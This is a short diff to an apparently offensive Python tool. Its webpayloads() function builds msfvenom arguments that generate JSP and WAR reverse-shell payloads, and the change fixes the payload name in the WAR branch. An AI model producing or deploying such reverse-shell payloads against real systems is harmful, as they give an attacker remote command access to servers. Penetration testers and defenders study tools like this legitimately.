@@ -123,7 +123,7 @@ def webpayloads():
 	elif payload == 'java/jsp_shell_reverse_tcp':
 		payload = ' -p '+payload + ' -f raw > shell.jsp'
 	elif payload ==	'java/jsp_sHell_reverse_tcp':
-		payload = ' -p '+payload + ' -f war > shell.war'
+		payload = ' -p java/jsp_shell_reverse_tcp -f war > shell.war'
 	return payload,gpa
 def scripting():
 	os.system('clear')
